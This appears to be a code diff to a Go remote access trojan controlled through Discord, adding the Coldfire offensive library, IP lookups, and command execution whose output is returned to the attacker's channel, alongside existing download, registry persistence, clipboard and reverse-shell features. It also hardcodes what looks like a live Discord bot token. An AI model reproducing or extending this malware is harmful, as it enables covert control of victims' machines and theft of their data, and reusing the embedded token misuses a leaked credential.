@@ -30,6 +30,7 @@ import (
 	"github.com/mitchellh/go-ps"
 	"github.com/atotto/clipboard"
 	"github.com/google/uuid"
+	"github.com/redcode-labs/Coldfire"
 	
 	clr "github.com/ropnop/go-clr"
 )
@@ -39,7 +40,7 @@ type shellcode struct {
 }
 
 
-var DISCORD_TOKEN string = "YOUR_TOKEN_HERE"
+var DISCORD_TOKEN string = "OTEyODM5NDk1NzUyMjUzNDUw.YZ1yBw.RpcC1kxZ183ZwvnmXZ34Xs8UU54"
 
 var RSHELL_HOST string
 var RSHELL_PORT int
@@ -76,6 +77,16 @@ func ExePath() string {
 	}
 	exPath := filepath.Dir(ex)
 	return exPath
+}
+
+func GetLocalIP() string {
+	ip := coldfire.GetLocalIp()
+	return ip
+}
+
+func GetGlobalIP() string {
+	ip := coldfire.GetGlobalIp()
+	return ip
 }
 
 func checkOK(hr uintptr, caller string) {
@@ -283,17 +294,12 @@ func downloadFile(filepath string, url string) (err error) {
 	return nil
 }
 
-func commandRunner(app string, arg string) {
-
-	cmd := exec.Command(app, arg)
-	_, err := cmd.Output()
-
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-
+func ExecuteCommand(command string) string{
+	output, err := coldfire.CmdOut(command)
 	if err != nil {
-		fmt.Println(err.Error())
-		return
+		return err.Error()
 	}
+	return output
 }
 
 func takeSnapshot() string {
@@ -467,10 +473,11 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 		if strings.HasPrefix(m.Content, "!exec-command ") {
 			comm := m.Content[14:]
 			s.ChannelMessageSend(m.ChannelID, "Attempting to run your command")
-			app := "cmd.exe"
-			arg := fmt.Sprintf("/c %s", comm)
-			go commandRunner(app, arg)
+			output := ExecuteCommand(comm)
+			s.ChannelMessageSend(m.ChannelID, output)
 		}
+
+
 	
 		if strings.HasPrefix(m.Content, "!download ") {
 			// For now assuming this is an exe will add filename helper functions for filename later
@@ -488,6 +495,16 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 		if m.Content == "!persist-user" {
 			s.ChannelMessageSend(m.ChannelID, "Attempting to persist to registry Current User run")
 			go CurrentUserPersist()
+		}
+
+		if m.Content == "!get-local-ip" {
+			ip := GetLocalIP()
+			s.ChannelMessageSend(m.ChannelID, ip)
+		}
+
+		if m.Content == "!get-global-ip" {
+			ip := GetGlobalIP()
+			s.ChannelMessageSend(m.ChannelID, ip)
 		}
 
 		if m.Content == "!get-clipboard" {
